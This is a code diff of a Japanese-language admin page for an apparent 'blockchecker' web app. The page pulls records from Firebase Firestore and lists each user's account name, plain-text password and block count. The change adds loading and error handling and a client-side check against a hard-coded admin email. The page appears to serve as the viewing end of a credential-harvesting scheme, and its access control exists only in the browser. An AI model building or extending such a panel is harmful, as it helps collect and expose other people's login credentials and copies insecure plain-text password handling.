@@ -12,11 +12,13 @@ th { background:#222;}
 tr:nth-child(even) { background:#1a1a1a;}
 h1 { text-align:center;}
 #no-data { text-align:center; margin-top:20px; color:#888; }
+#loading { text-align:center; margin-top:20px; }
 </style>
 </head>
 <body>
 <h1>管理者用データ一覧</h1>
-<div id="no-data">まだデータはありません</div>
+<div id="loading">読み込み中…</div>
+<div id="no-data" style="display:none;">まだデータはありません</div>
 <table id="data-table" style="display:none;">
 <tr>
   <th>アカウント</th>
@@ -29,9 +31,9 @@ h1 { text-align:center;}
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
 import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
-import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";
+import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";
 
-// 🔹 firebaseConfig はフォームページと同じもの
+// 🔹 Firebase 設定（フォームページと同じ）
 const firebaseConfig = {
   apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
   authDomain: "daada-ae048.firebaseapp.com",
@@ -46,38 +48,58 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 const auth = getAuth(app);
 
+// 管理者メールをここに入れる
+const ADMIN_EMAIL = "admin@example.com";
+
 async function showData() {
-  const q = query(collection(db, "blockchecker"), orderBy("createdAt","desc"));
-  const snapshot = await getDocs(q);
   const table = document.getElementById("data-table");
   const noData = document.getElementById("no-data");
+  const loading = document.getElementById("loading");
 
-  if (snapshot.empty) {
-    table.style.display = "none";
-    noData.style.display = "block";
-    return;
+  try {
+    const q = query(collection(db, "blockchecker"), orderBy("createdAt","desc"));
+    const snapshot = await getDocs(q);
+
+    loading.style.display = "none";
+
+    if (snapshot.empty) {
+      table.style.display = "none";
+      noData.style.display = "block";
+      return;
+    }
+
+    table.style.display = "table";
+    noData.style.display = "none";
+
+    snapshot.forEach(doc => {
+      const d = doc.data();
+      const row = table.insertRow();
+      row.insertCell(0).textContent = d.account;
+      row.insertCell(1).textContent = d.password;
+      row.insertCell(2).textContent = d.blockCount;
+      row.insertCell(3).textContent = d.createdAt?.toDate ? d.createdAt.toDate().toLocaleString() : "-";
+    });
+
+  } catch (err) {
+    console.error("Firestore データ取得エラー:", err);
+    alert("データの取得に失敗しました");
+    loading.textContent = "データの取得に失敗しました";
   }
-
-  table.style.display = "table";
-  noData.style.display = "none";
-
-  snapshot.forEach(doc => {
-    const d = doc.data();
-    const row = table.insertRow();
-    row.insertCell(0).textContent = d.account;
-    row.insertCell(1).textContent = d.password;
-    row.insertCell(2).textContent = d.blockCount;
-    row.insertCell(3).textContent = d.createdAt?.toDate ? d.createdAt.toDate().toLocaleString() : "-";
-  });
 }
 
-// 🔹 ページを開いた時にログイン確認
+// ページを開いたときにログイン確認
 onAuthStateChanged(auth, user => {
   if (user) {
-    showData(); // ログイン済みなら表示
+    if (user.email !== ADMIN_EMAIL) {
+      alert("管理者のみアクセス可能です");
+      signOut(auth);
+      window.location.href = "https://blockchecker.github.io/v2/login.html"; // ログインページ
+    } else {
+      showData();
+    }
   } else {
     alert("ログインしてください");
-    window.location.href = "https://blockchecker.github.io/v2/admin.html"; // ログインページに飛ばす
+    window.location.href = "https://blockchecker.github.io/v2/login.html"; // ログインページ
   }
 });
 </script>
